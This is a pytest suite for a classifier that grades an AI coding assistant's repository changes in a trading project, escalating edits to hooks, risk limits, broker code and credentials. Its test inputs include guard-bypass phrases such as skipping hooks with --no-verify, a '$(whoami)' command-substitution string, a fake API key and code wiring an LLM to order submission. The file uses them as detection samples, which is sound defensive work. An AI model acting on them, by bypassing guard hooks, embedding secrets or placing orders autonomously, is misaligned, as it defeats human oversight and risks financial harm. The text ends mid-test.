"""test_cowork_change_classifier.py -- tests for the Cowork change classifier.

Every repository, manifest, policy, and registry used here is synthetic and lives
under pytest's tmp_path. An autouse fixture proves the real ${HOME} session registry
stays byte-identical across the whole suite.
"""
from __future__ import annotations

import ast
import hashlib
import io
import json
import os
import subprocess
import sys
import tokenize
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
CLASSIFIER = REPO_ROOT / "tools" / "cowork" / "change_classifier.py"
POLICY = REPO_ROOT / "tools" / "cowork" / "change_policy.json"
REAL_REGISTRY = Path.home() / ".claude" / "nova-session-registry.json"

sys.path.insert(0, str(CLASSIFIER.parent))
import change_classifier as cc            # noqa: E402
sys.path.pop(0)

CANARY = "NOVA_3T_CANARY_5d02af71"
SECRET_VALUE = "sk-ant-api03-Zq7NOTREALvalue00000000"

FA_AR, AAM, AM, PROHIBITED = "FA_AR", "AAM", "AM", "PROHIBITED"
EXIT = {FA_AR: 0, AAM: 5, AM: 6, PROHIBITED: 7}


# ------------------------------------------------------------------ helpers

def git(repo, *args, check=True):
    p = subprocess.run(["git", "-C", str(repo)] + list(args),
                       capture_output=True, text=True)
    if check and p.returncode != 0:
        raise AssertionError("git %s failed: %s" % (args[0], p.stderr))
    return p.stdout.strip()


def write(path, text):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(text if isinstance(text, bytes) else text.encode("utf-8"))
    return path


def make_repo(tmp_path, name="nova-demo"):
    repo = tmp_path / name
    repo.mkdir(parents=True)
    git(repo, "init", "-q", "-b", "work")
    git(repo, "config", "user.email", "t@example.invalid")
    git(repo, "config", "user.name", "T")
    git(repo, "config", "core.autocrlf", "false")
    write(repo / ".gitignore", "data/*.json\n*.log\n")
    write(repo / "docs" / "claude-cowork" / "README.md", "# Readme\n\nBody.\n")
    write(repo / "ui" / "html.py", "PAGE = 1\n")
    write(repo / "engines" / "risk_engine.py", "def size():\n    return 1\n")
    write(repo / "tools" / "cowork" / "helper.py", "VALUE = 1\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "init")
    return repo


def policy_doc():
    return json.loads(POLICY.read_text(encoding="utf-8"))


def write_policy(tmp_path, doc, name="policy.json"):
    p = tmp_path / name
    p.write_text(json.dumps(doc, indent=2), encoding="utf-8")
    return p


def run(mode, repo=None, policy=None, inp=None, fmt="json", extra=()):
    cmd = [sys.executable, "-B", str(CLASSIFIER), mode, "--format", fmt]
    if repo is not None:
        cmd += ["--repo", str(repo)]
    if policy is not None:
        cmd += ["--policy", str(policy)]
    cmd += list(extra)
    payload = b"" if inp is None else json.dumps(inp).encode("utf-8")
    p = subprocess.run(cmd, capture_output=True, input=payload)
    return (p.returncode, p.stdout.decode("utf-8", "replace"),
            p.stderr.decode("utf-8", "replace"))


def checks(out):
    return json.loads(out)["checks"]


def classes(out):
    """{label -> minimum class} for every per-path check."""
    found = {}
    for c in checks(out):
        if c["id"].startswith("C") and c["id"][1:].isdigit() and c["id"] != "C0":
            found[c["label"]] = c["evidence"].split(";")[0].replace("minimum ", "").strip()
    return found


def overall(out):
    for c in checks(out):
        if c["id"] == "R1":
            return c["evidence"].split(" -- ")[0].strip()
    return None


def findings_for(out, label):
    for c in checks(out):
        if c["label"] == label and "findings: " in c["evidence"]:
            return c["evidence"].split("findings: ")[1].split(";")[0].split(", ")
    return []


def manifest(changes, operation=None, **over):
    doc = {"schema_version": 1, "changes": changes}
    if operation:
        doc["declared_operation"] = operation
    doc.update(over)
    return doc


@pytest.fixture(autouse=True)
def _real_registry_untouched():
    before = (REAL_REGISTRY.exists(),
              REAL_REGISTRY.read_bytes() if REAL_REGISTRY.exists() else None)
    yield
    after = (REAL_REGISTRY.exists(),
             REAL_REGISTRY.read_bytes() if REAL_REGISTRY.exists() else None)
    assert before == after, "the real session registry was touched"


# ---------------------------------------------------------------- the policy

def test_shipped_policy_validates():
    rc, out, err = run("validate-policy")
    assert rc == 0, err
    assert json.loads(out)["overall_status"] == "passed"


def test_class_order_is_fixed():
    assert cc.CLASS_ORDER == ("FA_AR", "AAM", "AM", "PROHIBITED")
    assert cc.EXIT_BY_CLASS == {"FA_AR": 0, "AAM": 5, "AM": 6, "PROHIBITED": 7}


def test_policy_repository_write_floor_cannot_be_lowered(tmp_path):
    doc = policy_doc()
    doc["repository_write_floor"]["class"] = "FA_AR"
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2 and "never FA/AR" in err


@pytest.mark.parametrize("key", ["unknown_path_class", "unknown_change_kind_class",
                                 "ambiguous_class"])
def test_policy_fail_safe_must_be_am(tmp_path, key):
    doc = policy_doc()
    doc["fail_safe"][key] = "AAM"
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2 and key in err


def test_policy_deletion_floor_cannot_be_disabled(tmp_path):
    doc = policy_doc()
    doc["deletion_never_below_modification"] = False
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2


def test_policy_submodule_class_cannot_be_lowered(tmp_path):
    doc = policy_doc()
    doc["submodule"]["class"] = "AAM"
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2


def test_policy_binary_classes_cannot_be_lowered(tmp_path):
    doc = policy_doc()
    doc["binary"]["sensitive_area_class"] = "AAM"
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2


def test_policy_unknown_field_rejected(tmp_path):
    doc = policy_doc()
    doc["surprise"] = 1
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2 and "unrecognized" in err


def test_policy_unsupported_schema_rejected(tmp_path):
    doc = policy_doc()
    doc["schema_version"] = 99
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2


@pytest.mark.parametrize("pattern", ["**", "*", ".", "**/*", "./**"])
def test_policy_overly_broad_pattern_rejected(tmp_path, pattern):
    doc = policy_doc()
    doc["path_rules"][0]["patterns"] = [pattern]
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2 and "broad" in err


def test_policy_extension_glob_is_accepted(tmp_path):
    doc = policy_doc()
    doc["path_rules"][0]["patterns"] = ["*.example"]
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 0, err


def test_policy_absolute_pattern_rejected(tmp_path):
    doc = policy_doc()
    doc["path_rules"][0]["patterns"] = ["C:/secrets/**"]
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2


def test_policy_traversal_pattern_rejected(tmp_path):
    doc = policy_doc()
    doc["path_rules"][0]["patterns"] = ["../elsewhere/**"]
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2 and "traversal" in err


def test_policy_duplicate_pattern_across_rules_rejected(tmp_path):
    doc = policy_doc()
    doc["path_rules"][-1]["patterns"].append("docs/**")
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2 and "two rules" in err


def test_policy_executable_construct_rejected(tmp_path):
    doc = policy_doc()
    doc["description"] = "run $(whoami) first"
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2 and "executable" in err


def test_policy_machine_path_rejected(tmp_path):
    doc = policy_doc()
    doc["description"] = "policy for C:\\Repos\\NOVA"
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2


def test_policy_url_rejected(tmp_path):
    doc = policy_doc()
    doc["description"] = "see https://example.invalid/policy"
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2


def test_policy_declares_exactly_the_implemented_indicators(tmp_path):
    assert set(policy_doc()["semantic_indicators"]) == set(cc.INDICATOR_IDS)


def test_policy_indicator_mismatch_rejected(tmp_path):
    doc = policy_doc()
    doc["semantic_indicators"]["invented_indicator"] = {"class": "AM", "reason": "x"}
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2 and "disagree" in err


def test_policy_prohibited_indicator_must_declare_prohibited(tmp_path):
    doc = policy_doc()
    doc["semantic_indicators"]["guard_bypass"]["class"] = "AM"
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2 and "listed as prohibited" in err


def test_policy_must_state_scanning_cannot_prove_absence(tmp_path):
    doc = policy_doc()
    doc["semantic_scanning_note"] = "Scanning finds everything dangerous."
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2 and "cannot prove" in err


def test_policy_ignored_files_must_stay_out_of_git_classification(tmp_path):
    doc = policy_doc()
    doc["ignored_files"]["enter_git_classification"] = True
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2


def test_policy_historical_presence_must_not_authorize(tmp_path):
    doc = policy_doc()
    doc["historical_presence"]["authorizes_new_changes"] = True
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 2


@pytest.mark.parametrize("key", sorted(cc.LIMIT_MAXIMUMS))
def test_policy_cannot_raise_any_implementation_maximum(tmp_path, key):
    doc = policy_doc()
    doc["limits"][key] = cc.LIMIT_MAXIMUMS[key] + 1
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 3 and "implementation maximum" in err


@pytest.mark.parametrize("key", sorted(cc.LIMIT_MAXIMUMS))
def test_policy_may_lower_any_limit(tmp_path, key):
    doc = policy_doc()
    doc["limits"][key] = max(1, cc.LIMIT_MAXIMUMS[key] // 2)
    rc, _out, err = run("validate-policy", policy=write_policy(tmp_path, doc))
    assert rc == 0, err


def test_missing_policy_exits_two(tmp_path):
    rc, _out, err = run("validate-policy", policy=tmp_path / "absent.json")
    assert rc == 2 and "could not be read" in err


def test_malformed_policy_exits_two(tmp_path):
    p = tmp_path / "bad.json"
    p.write_text("{nope", encoding="utf-8")
    rc, _out, err = run("validate-policy", policy=p)
    assert rc == 2


def test_policy_contains_no_regular_expression():
    """Detection patterns live in reviewable source, never in the data policy."""
    raw = POLICY.read_text(encoding="utf-8")
    # Unambiguous regex markers only. A glob such as `.env.*` is a path pattern.
    for token in ("re.compile", "(?i)", "(?:", "\\\\b", "\\\\s", "\\\\d", "\\\\w",
                  "[a-z", "[A-Z", "[0-9", "+?", "{0,"):
        assert token not in raw, token


# ------------------------------------------------------------------- the CLI

def test_supported_modes_are_exactly_six():
    assert cc.MODES == ("classify-worktree", "classify-staged", "classify-commit",
                        "classify-range", "classify-manifest", "validate-policy")


@pytest.mark.parametrize("verb", ["approve", "apply", "stage", "commit", "push",
                                  "merge", "deploy", "authorize", "allow", "grant"])
def test_mutating_or_approving_verbs_are_not_modes(verb, tmp_path):
    rc, _out, _err = run(verb, repo=make_repo(tmp_path))
    assert rc == 2, verb


def test_help_exits_zero():
    p = subprocess.run([sys.executable, "-B", str(CLASSIFIER), "--help"],
                       capture_output=True)
    assert p.returncode == 0


def test_git_modes_require_a_repository():
    for mode in ("classify-worktree", "classify-staged", "classify-commit",
                 "classify-range"):
        rc, _out, err = run(mode)
        assert rc == 2 and "--repo" in err, mode


def test_non_repository_is_stopped(tmp_path):
    plain = tmp_path / "plain"
    plain.mkdir()
    rc, out, _err = run("classify-worktree", repo=plain)
    assert rc == 4


# --------------------------------------------------------- classes and modes

def test_read_only_operation_with_no_change_is_fa_ar_via_manifest(tmp_path):
    """A declared read-only operation that changes no path is stopped, not approved."""
    rc, out, _err = run("classify-manifest",
                        inp=manifest([], operation="format-evidence"))
    assert rc == 4
    assert "nothing is approved" in out


def test_documentation_write_is_aam_not_fa_ar(tmp_path):
    rc, out, err = run("classify-manifest", inp=manifest(
        [{"path": "docs/claude-cowork/README.md", "kind": "modify"}],
        operation="format-evidence"))
    assert rc == EXIT[AAM], err
    assert classes(out)["docs/claude-cowork/README.md"] == AAM
    assert overall(out) == AAM


def test_cowork_source_and_test_edits_are_aam():
    rc, out, err = run("classify-manifest", inp=manifest([
        {"path": "tools/cowork/change_classifier.py", "kind": "modify"},
        {"path": "tests/test_cowork_change_classifier.py", "kind": "modify"}]))
    assert rc == EXIT[AAM], err
    assert set(classes(out).values()) == {AAM}


def test_ordinary_source_edit_is_aam():
    rc, out, err = run("classify-manifest",
                       inp=manifest([{"path": "ui/html.py", "kind": "modify"}]))
    assert rc == EXIT[AAM], err
    assert classes(out)["ui/html.py"] == AAM


@pytest.mark.parametrize("path", [
    ".claude/settings.local.json",
    ".claude/hooks/nova_guard_hook.py",
    ".claude/settings.json",
    ".github/workflows/ci.yml",
])
def test_hook_settings_and_permission_paths_are_am(path):
    rc, out, err = run("classify-manifest",
                       inp=manifest([{"path": path, "kind": "modify"}]))
    assert rc == EXIT[AM], err
    assert classes(out)[path] == AM


@pytest.mark.parametrize("path", [
    "nova_knowledge_core/RULES/orb.md",
    "engines/risk_engine.py",
    "core/config.py",
    "main.py",
    "monitor.py",
    "services/execution.py",
    "services/execution_bridge.py",
    "services/broker_link.py",
    "services/alpaca_client.py",
    "engines/reasoning.py",
    "delivery/alert_engine.py",
    "indicators/nova_market_map_v1.pine",
    ".env",
    "credentials.json",
])
def test_strategy_risk_execution_and_broker_paths_are_am(path):
    rc, out, err = run("classify-manifest",
                       inp=manifest([{"path": path, "kind": "modify"}]))
    assert rc == EXIT[AM], err
    assert classes(out)[path] == AM


def test_submodule_pointer_is_am():
    rc, out, err = run("classify-manifest",
                       inp=manifest([{"path": "mcp/tradingview", "kind": "gitlink"}]))
    assert rc == EXIT[AM], err
    assert classes(out)["mcp/tradingview"] == AM


def test_gitmodules_is_am():
    rc, out, err = run("classify-manifest",
                       inp=manifest([{"path": ".gitmodules", "kind": "modify"}]))
    assert rc == EXIT[AM], err


@pytest.mark.parametrize("operation", [
    "push", "merge", "deploy", "release", "delete-branch", "remove-worktree",
    "rewrite-history", "change-permissions", "change-hooks", "change-settings",
    "promote-research", "secrets-operation", "change-submodule-pointer",
])
def test_outward_and_destructive_operations_are_am(operation):
    rc, out, err = run("classify-manifest", inp=manifest(
        [{"path": "docs/notes.md", "kind": "modify"}], operation=operation))
    assert rc == EXIT[AM], err
    assert overall(out) == AM


@pytest.mark.parametrize("operation", [
    "enable-trading-flag", "bypass-guard", "wire-llm-to-orders", "autonomous-order",
    "embed-credentials", "auto-promote-research", "remove-risk-limit",
    "treat-approval-required-as-approval", "execute-supplied-content",
])
def test_prohibited_operations_are_prohibited(operation):
    rc, out, err = run("classify-manifest", inp=manifest(
        [{"path": "docs/notes.md", "kind": "modify"}], operation=operation))
    assert rc == EXIT[PROHIBITED], err
    assert overall(out) == PROHIBITED


def test_most_restrictive_aggregation():
    rc, out, err = run("classify-manifest", inp=manifest([
        {"path": "docs/notes.md", "kind": "modify"},
        {"path": "ui/html.py", "kind": "modify"},
        {"path": "core/config.py", "kind": "modify"}]))
    assert rc == EXIT[AM], err
    assert overall(out) == AM
    assert classes(out)["docs/notes.md"] == AAM


def test_prohibited_dominates_am():
    rc, out, err = run("classify-manifest", inp=manifest([
        {"path": "core/config.py", "kind": "modify"},
        {"path": "nova_knowledge_core/TRANSCRIPTS_RAW/raw.md", "kind": "add"}]))
    assert rc == EXIT[PROHIBITED], err
    assert overall(out) == PROHIBITED


def test_most_restrictive_helper_never_lowers():
    assert cc.most_restrictive(AAM, AM) == AM
    assert cc.most_restrictive(AM, AAM) == AM
    assert cc.most_restrictive(PROHIBITED, FA_AR) == PROHIBITED
    assert cc.most_restrictive(FA_AR, None) == FA_AR
    assert cc.most_restrictive("nonsense", FA_AR) == AM      # fail-safe


# ------------------------------------------------------- escalation behaviour

def test_deletion_is_never_below_modification():
    rc, out, _err = run("classify-manifest",
                        inp=manifest([{"path": "ui/html.py", "kind": "delete"}]))
    mod = run("classify-manifest",
              inp=manifest([{"path": "ui/html.py", "kind": "modify"}]))[1]
    assert cc.CLASS_RANK[classes(out)["ui/html.py"]] >= \
        cc.CLASS_RANK[classes(mod)["ui/html.py"]]


def test_deletion_of_a_sensitive_path_is_am():
    rc, out, err = run("classify-manifest",
                       inp=manifest([{"path": "engines/risk_engine.py", "kind": "delete"}]))
    assert rc == EXIT[AM], err


def test_rename_considers_both_sides():
    rc, out, err = run("classify-manifest", inp=manifest([
        {"path": "docs/moved.md", "kind": "rename",
         "source_path": "engines/risk_engine.py"}]))
    assert rc == EXIT[AM], err
    ev = [c["evidence"] for c in checks(out) if "moved.md" in c["label"]][0]
    assert "rename source" in ev


def test_rename_destination_never_softens_the_source():
    to_docs = run("classify-manifest", inp=manifest([
        {"path": "docs/x.md", "kind": "rename", "source_path": "core/config.py"}]))
    assert to_docs[0] == EXIT[AM]


def test_case_only_rename_is_represented():
    rc, out, err = run("classify-manifest", inp=manifest([
        {"path": "docs/Readme.md", "kind": "rename", "source_path": "docs/README.md"}]))
    assert rc == EXIT[AAM], err
    ev = [c["evidence"] for c in checks(out) if "Readme.md" in c["label"]][0]
    assert "case-only rename" in ev


def test_rename_requires_a_source_path():
    rc, _out, err = run("classify-manifest",
                        inp=manifest([{"path": "docs/x.md", "kind": "rename"}]))
    assert rc == 2 and "source_path" in err


def test_binary_escalates_to_at_least_aam():
    rc, out, err = run("classify-manifest", inp=manifest(
        [{"path": "docs/chart.png", "kind": "add", "binary": True}]))
    assert rc == EXIT[AAM], err
    assert "binary content" in json.dumps(checks(out))


def test_binary_in_a_sensitive_area_is_am():
    rc, out, err = run("classify-manifest", inp=manifest(
        [{"path": "services/blob.bin", "kind": "add", "binary": True}]))
    assert rc == EXIT[AM], err


def test_unknown_path_falls_back_to_am():
    rc, out, err = run("classify-manifest",
                       inp=manifest([{"path": "somewhere/new.txt", "kind": "modify"}]))
    assert rc == EXIT[AM], err
    assert "unknown path" in json.dumps(checks(out))


def test_unknown_change_kind_is_rejected():
    rc, _out, err = run("classify-manifest",
                        inp=manifest([{"path": "docs/x.md", "kind": "teleport"}]))
    assert rc == 2 and "unrecognized kind" in err


def test_typechange_is_am():
    rc, out, err = run("classify-manifest",
                       inp=manifest([{"path": "docs/x.md", "kind": "typechange"}]))
    assert rc == EXIT[AM], err


@pytest.mark.parametrize("path", [
    "nova_knowledge_core/TRANSCRIPTS_RAW/evan.md",
    "data/nova_state_engine.json",
    "app/__pycache__/x.pyc",
    "build.log",
    "notes.tmp",
])
def test_generated_runtime_and_transcript_additions_are_prohibited(path):
    rc, out, err = run("classify-manifest",
                       inp=manifest([{"path": path, "kind": "add"}]))
    assert rc == EXIT[PROHIBITED], err
    assert classes(out)[path] == PROHIBITED


def test_runtime_exception_path_is_not_prohibited():
    rc, out, err = run("classify-manifest",
                       inp=manifest([{"path": "data/donna_settings.json",
                                      "kind": "modify"}]))
    assert rc != EXIT[PROHIBITED], err


def test_semantic_findings_escalate_but_never_downgrade():
    """A documentation path (AAM) plus a risk finding becomes AM, never less."""
    rc, out, err = run("classify-manifest", inp=manifest([
        {"path": "docs/notes.md", "kind": "modify",
         "semantic_findings": ["risk_limit_change"]}]))
    assert rc == EXIT[AM], err
    assert classes(out)["docs/notes.md"] == AM


def test_a_semantic_finding_cannot_lower_a_path_rule():
    """An FA/AR-classed finding does not exist, but even so the path rule holds."""
    rc, out, err = run("classify-manifest", inp=manifest([
        {"path": "core/config.py", "kind": "modify",
         "semantic_findings": ["broker_order_api"]}]))
    assert classes(out)["core/config.py"] == AM


def test_unknown_semantic_finding_escalates():
    rc, out, err = run("classify-manifest", inp=manifest([
        {"path": "docs/notes.md", "kind": "modify",
         "semantic_findings": ["invented_finding"]}]))
    assert rc == EXIT[AM], err
    assert "unknown semantic finding" in json.dumps(checks(out))


def test_declared_protected_change_stays_am_regardless_of_tests():
    rc, out, err = run("classify-manifest", inp=manifest(
        [{"path": "engines/risk_engine.py", "kind": "modify"}],
        operation="local-commit",
        notes=["the full suite passes"]))
    assert rc == EXIT[AM], err
    assert overall(out) == AM


def test_historical_presence_does_not_lower_a_class(tmp_path):
    """A long-tracked sensitive file is still AM when changed now."""
    repo = make_repo(tmp_path)
    write(repo / "engines" / "risk_engine.py", "def size():\n    return 2\n")
    rc, out, err = run("classify-worktree", repo=repo)
    assert rc == EXIT[AM], err
    assert classes(out)["engines/risk_engine.py"] == AM


# ---------------------------------------------------------- semantic scanning

def _scan_repo_file(tmp_path, rel, body, name="scan-demo"):
    repo = make_repo(tmp_path, name)
    write(repo / rel.replace("/", os.sep), body)
    return repo, run("classify-worktree", repo=repo)


def test_modified_tracked_file_is_actually_scanned(tmp_path):
    """An UNSTAGED edit to a TRACKED file has no blob; it must still be scanned.

    Git reports an all-zero object id for that side, so the working file has to be
    read instead. Scanning only untracked additions would leave the most ordinary
    edit of all silently unexamined.
    """
    repo = make_repo(tmp_path)
    write(repo / "docs" / "claude-cowork" / "README.md",
          "# Readme\n\nSet NOVA_TRADING_SUBSYSTEM_ENABLED = true here.\n")
    rc, out, err = run("classify-worktree", repo=repo)
    assert rc == EXIT[PROHIBITED], err + out
    assert "retirement_flag_activation" in findings_for(
        out, "docs/claude-cowork/README.md")


def test_modified_tracked_file_content_is_never_reported_unavailable(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "ui" / "html.py", "PAGE = 2\n")
    rc, out, err = run("classify-worktree", repo=repo)
    assert rc == EXIT[AAM], err
    assert "could not be obtained" not in json.dumps(checks(out))


def test_staged_file_is_actually_scanned(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "docs" / "claude-cowork" / "README.md",
          "# Readme\n\nRaise max_daily_loss substantially.\n")
    git(repo, "add", "-A")
    rc, out, err = run("classify-staged", repo=repo)
    assert rc == EXIT[AM], err
    assert "risk_limit_change" in findings_for(out, "docs/claude-cowork/README.md")


def test_committed_file_is_actually_scanned(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "docs" / "claude-cowork" / "README.md",
          "# Readme\n\nWe will bypass the guard hook.\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "edit")
    rc, out, err = run("classify-commit", repo=repo,
                       extra=["--commit", git(repo, "rev-parse", "HEAD")])
    assert rc == EXIT[PROHIBITED], err + out


def test_full_object_ids_are_requested_from_git():
    """Abbreviated ids broke null-id detection once; --no-abbrev prevents a repeat."""
    src = CLASSIFIER.read_text(encoding="utf-8")
    for node in ast.walk(ast.parse(src)):
        if not isinstance(node, ast.Call):
            continue
        name = _dotted(node.func) or getattr(node.func, "id", None)
        if name not in ("_git", "_git_ok"):
            continue
        for arg in node.args:
            if not isinstance(arg, ast.List) or not arg.elts:
                continue
            items = [e.value for e in arg.elts
                     if isinstance(e, ast.Constant) and isinstance(e.value, str)]
            if "--raw" in items:
                assert "--no-abbrev" in items, items


def test_retirement_flag_activation_is_prohibited(tmp_path):
    repo, (rc, out, err) = _scan_repo_file(
        tmp_path, "docs/plan.md", "Set NOVA_TRADING_SUBSYSTEM_ENABLED = true\n")
    assert rc == EXIT[PROHIBITED], err
    assert "retirement_flag_activation" in findings_for(out, "docs/plan.md")


def test_auto_execute_flag_activation_is_prohibited(tmp_path):
    repo, (rc, out, err) = _scan_repo_file(
        tmp_path, "docs/plan.md", 'NOVA_AUTO_EXECUTE="1"\n')
    assert rc == EXIT[PROHIBITED], err


def test_flag_mentioned_without_activation_is_not_prohibited(tmp_path):
    repo, (rc, out, err) = _scan_repo_file(
        tmp_path, "docs/plan.md",
        "NOVA_TRADING_SUBSYSTEM_ENABLED stays false and is never turned on.\n")
    assert rc != EXIT[PROHIBITED], out


@pytest.mark.parametrize("body", [
    "We should disable the guard hook for this run.\n",
    "Add --no-verify so the hook is skipped.\n",
    "GUARD_DISABLED = True\n",
    "bypass the PreToolUse check\n",
])
def test_guard_bypass_language_is_prohibited(tmp_path, body):
    repo, (rc, out, err) = _scan_repo_file(tmp_path, "docs/plan.md", body)
    assert rc == EXIT[PROHIBITED], out


def test_llm_wired_to_the_order_path_is_prohibited(tmp_path):
    repo, (rc, out, err) = _scan_repo_file(
        tmp_path, "ui/wire.py",
        "from anthropic import Anthropic\n\n"
        "def act(decision):\n    return trading_client.submit_order(decision)\n")
    assert rc == EXIT[PROHIBITED], out
    assert "llm_to_order_path" in findings_for(out, "ui/wire.py")


def test_llm_alone_is_not_prohibited(tmp_path):
    repo, (rc, out, err) = _scan_repo_file(
        tmp_path, "ui/wire.py", "from anthropic import Anthropic\n")
    assert rc != EXIT[PROHIBITED], out


def test_autonomous_order_submission_is_prohibited(tmp_path):
    repo, (rc, out, err) = _scan_repo_file(
        tmp_path, "docs/plan.md",
        "The bot will automatically submit orders without approval.\n")
    assert rc == EXIT[PROHIBITED], out


def test_secret_insertion_is_prohibited_without_leaking_the_value(tmp_path):
    repo, (rc, out, err) = _scan_repo_file(
        tmp_path, "ui/conf.py", 'ANTHROPIC_API_KEY = "%s"\n' % SECRET_VALUE)
    assert rc == EXIT[PROHIBITED], out
    assert "credential_material" in findings_for(out, "ui/conf.py")
    assert SECRET_VALUE not in out + err


def test_environment_lookup_is_not_a_credential(tmp_path):
    repo, (rc, out, err) = _scan_repo_file(
        tmp_path, "ui/conf.py", 'API_KEY = os.environ["ANTHROPIC_API_KEY"]\n')
    assert rc != EXIT[PROHIBITED], out


def test_automatic_research_promotion_is_prohibited(tmp_path):
    repo, (rc, out, err) = _scan_repo_file(
        tmp_path, "docs/plan.md",
        "Findings are automatically promoted to approved rules each night.\n")
    assert rc == EXIT[PROHIBITED], out


def test_risk_limit_language_escalates_to_am(tmp_path):
    repo, (rc, out, err) = _scan_repo_file(
        tmp_path, "docs/plan.md", "Raise max_daily_loss to a larger value.\n")
    assert rc == EXIT[AM], out
    assert "risk_limit_change" in findings_for(out, "docs/plan.md")


def test_broker_api_reference_escalates_to_am(tmp_path):
    repo, (rc, out, err) = _scan_repo_file(
        tmp_path, "docs/plan.md", "Call cancel_order when the session ends.\n")
    assert rc == EXIT[AM], out


def test_deployment_intent_escalates_to_am(tmp_path):
    repo, (rc, out, err) = _scan_repo_file(
        tmp_path, "docs/plan.md", "Then git push and deploy to production.\n")
    assert rc == EXIT[AM], out


def test_scan_never_prints_matched_text(tmp_path):
    repo, (rc, out, err) = _scan_repo_file(
        tmp_path, "docs/plan.md",
        "%s\nANTHROPIC_API_KEY = \"%s\"\nmax_daily_loss = 999\n" % (CANARY, SECRET_VALUE))
    blob = out + err
    assert CANARY not in blob
    assert SECRET_VALUE not in blob
    assert "999" not in blob


def test_unscanned_oversized_content_is_ambiguous_not_clean(tmp_path):
    doc = policy_doc()
    doc["limits"]["max_scan_bytes"] = 64
    pol = write_policy(tmp_path, doc)
    repo = make_repo(tmp_path)
    write(repo / "docs" / "big.md", "# big\n" + ("x " * 500) + "\n")
    rc, out, err = run("classify-worktree", repo=repo, policy=pol)
    assert rc == EXIT[AM], err
    assert "too large to scan" in json.dumps(checks(out))


# ------------------------------------------------------------------- git modes

def test_classify_worktree(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "docs" / "claude-cowork" / "README.md", "# Readme\n\nEdited.\n")
    write(repo / "ui" / "new_panel.py", "PANEL = 1\n")
    rc, out, err = run("classify-worktree", repo=repo)
    assert rc == EXIT[AAM], err
    got = classes(out)
    assert got["docs/claude-cowork/README.md"] == AAM
    assert got["ui/new_panel.py"] == AAM


def test_classify_worktree_ignores_ignored_files(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "data" / "state.json", "{}\n")
    write(repo / "run.log", "noise\n")
    write(repo / "docs" / "claude-cowork" / "README.md", "# Readme\n\nEdited.\n")
    rc, out, err = run("classify-worktree", repo=repo)
    assert rc == EXIT[AAM], err
    got = classes(out)
    assert "data/state.json" not in got
    assert "run.log" not in got


def test_ignored_file_is_classified_when_a_manifest_supplies_it():
    rc, out, err = run("classify-manifest",
                       inp=manifest([{"path": "data/state.json", "kind": "add"}]))
    assert rc == EXIT[PROHIBITED], err


def test_classify_staged(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "engines" / "risk_engine.py", "def size():\n    return 3\n")
    git(repo, "add", "--", "engines/risk_engine.py")
    rc, out, err = run("classify-staged", repo=repo)
    assert rc == EXIT[AM], err
    assert classes(out)["engines/risk_engine.py"] == AM


def test_classify_staged_ignores_unstaged(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "ui" / "html.py", "PAGE = 2\n")
    rc, out, _err = run("classify-staged", repo=repo)
    assert rc == 4


def test_classify_commit(tmp_path):
    repo = make_repo(tmp_path)
    write(repo / "core" / "config.py", "FLAG = 1\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "config")
    oid = git(repo, "rev-parse", "HEAD")
    rc, out, err = run("classify-commit", repo=repo, extra=["--commit", oid])
    assert rc == EXIT[AM], err
    assert classes(out)["core/config.py"] == AM


def test_classify_commit_rejects_a_bad_object_id(tmp_path):
    repo = make_repo(tmp_path)
    rc, _out, err = run("classify-commit", repo=repo, extra=["--commit", "not-an-oid"])
    assert rc == 2


def test_classify_commit_stops_on_an_unknown_commit(tmp_path):
    repo = make_repo(tmp_path)
    rc, out, _err = run("classify-commit", repo=repo, extra=["--commit", "f" * 40])
    assert rc == 4


def test_classify_range(tmp_path):
    repo = make_repo(tmp_path)
    base = git(repo, "rev-parse", "HEAD")
    write(repo / "docs" / "new.md", "# new\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "one")
    write(repo / "main.py", "app = 1\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "two")
    head = git(repo, "rev-parse", "HEAD")
    rc, out, err = run("classify-range", repo=repo,
                       extra=["--base", base, "--head", head])
    assert rc == EXIT[AM], err
    got = classes(out)
    assert got["docs/new.md"] == AAM and got["main.py"] == AM


def test_classify_range_requires_both_ends(tmp_path):
    repo = make_repo(tmp_path)
    rc, _out, err = run("classify-range", repo=repo, extra=["--base", "HEAD"])
